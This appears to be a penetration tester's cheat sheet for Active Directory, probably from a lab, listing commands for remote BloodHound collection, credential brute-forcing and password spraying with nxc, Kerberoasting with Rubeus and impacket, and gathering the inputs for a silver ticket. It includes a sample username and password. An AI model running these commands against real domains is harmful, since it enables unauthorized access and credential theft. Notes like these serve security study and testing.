# Active Directory

## Bloodhound
- Start neo4j: `sdo neo4j console`
- Start Bloodhound Legacy: `sudo ./BloodHound --no-sandbox --disable-gpu`
- Collect data remotely: `bloodhound-python -d nagoya-industries.com -u Craig.Carr -p 'Spring2023' -gc nagoya-industries.com -c all -ns 192.168.155.21 --zip`
- Upload ZIP file to Bloodhound and analyze results

## Finding valid credentials
- Trying all users and password combinations: `nxc smb 192.168.155.21 -u users.txt -p passwords.txt --continue-on-success`
  - Add `no-bruteforce` to check line-by-line usernames and passwords

## Valid domain credentials
- Checking access: `nxc <smb|ldap|winrm|rdp> 192.168.155.21 -u Craig.Carr -p Spring2023`
- List other domain users: `nxc smb 192.168.155.21 -u Craig.Carr -p Spring2023 --users`

## User Credentials
- When finding a large list of users, try password spraying with a common password, like:
  - `<Season><Year>`
 
## Finding user accounts
  - PowerView:
    - `Import-Module .\PowerView.ps1`
    - `Get-NetUser | select cn`

## Kerberoasting
- Locally with current credentials: `.\Rubeus.exe kerberoast /outfile:hashes.txt`
- Remotely: `impacket-GetUserSPNs -request -dc-ip 192.168.155.21 nagoya-industries.com/Craig.Carr`

## Silver ticket
- With service account hash or password, a service ticket can be created for any user
- Collect domain SID: `whoami /user`
- Collect SPN:
  - Use Bloodhound
  - PowerView:
    - `Import-Module .\PowerView.ps1`
    - `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
  - For specific service account: `setspn -L <service_account>`
